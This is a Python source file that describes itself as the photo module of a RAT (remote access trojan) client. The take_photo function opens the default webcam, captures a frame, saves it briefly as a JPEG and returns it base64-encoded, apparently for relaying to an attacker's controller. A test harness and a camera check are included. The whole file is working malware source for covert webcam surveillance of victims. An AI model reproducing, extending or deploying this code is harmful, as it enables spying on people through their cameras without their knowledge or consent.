"""
Photo module for RAT client
Captures photos using system camera
"""

import cv2
import base64
import os
import tempfile
import time
from typing import Optional

def take_photo() -> Optional[str]:
    """
    Take a photo using the default camera
    Returns base64 encoded image data or None if failed
    """
    camera = None
    try:
        print("[*] Initializing camera...")
        
        # Try to initialize camera (index 0 is usually the default camera)
        camera = cv2.VideoCapture(0)
        
        if not camera.isOpened():
            print("[-] Could not open camera")
            return None
        
        # Set camera properties for better quality
        camera.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        
        # Allow camera to warm up
        print("[*] Camera warming up...")
        time.sleep(1)
        
        # Capture frame
        print("[*] Capturing photo...")
        ret, frame = camera.read()
        
        if not ret or frame is None:
            print("[-] Failed to capture frame")
            return None
        
        # Create temporary file to save image
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
            temp_path = temp_file.name
        
        # Save frame as JPEG
        success = cv2.imwrite(temp_path, frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
        
        if not success:
            print("[-] Failed to save photo")
            if os.path.exists(temp_path):
                os.unlink(temp_path)
            return None
        
        # Read image file and encode to base64
        with open(temp_path, 'rb') as img_file:
            image_data = img_file.read()
            base64_data = base64.b64encode(image_data).decode('utf-8')
        
        # Clean up temporary file
        os.unlink(temp_path)
        
        print(f"[+] Photo captured successfully ({len(image_data)} bytes)")
        return base64_data
        
    except Exception as e:
        print(f"[-] Photo capture error: {e}")
        return None
        
    finally:
        if camera is not None:
            camera.release()
            print("[*] Camera released")

def test_camera() -> bool:
    """
    Test if camera is available
    Returns True if camera can be accessed, False otherwise
    """
    try:
        camera = cv2.VideoCapture(0)
        if camera.isOpened():
            ret, frame = camera.read()
            camera.release()
            return ret and frame is not None
        return False
    except:
        return False

if __name__ == "__main__":
    # Test the photo module
    print("Testing camera...")
    
    if not test_camera():
        print("Camera not available or not working")
        exit(1)
    
    print("Camera test passed, taking photo...")
    photo_data = take_photo()
    
    if photo_data:
        print(f"Photo captured successfully! Data length: {len(photo_data)}")
        
        # Save test photo
        test_filename = f"test_photo_{int(time.time())}.jpg"
        with open(test_filename, 'wb') as f:
            f.write(base64.b64decode(photo_data))
        print(f"Test photo saved as: {test_filename}")
    else:
        print("Photo capture failed!") 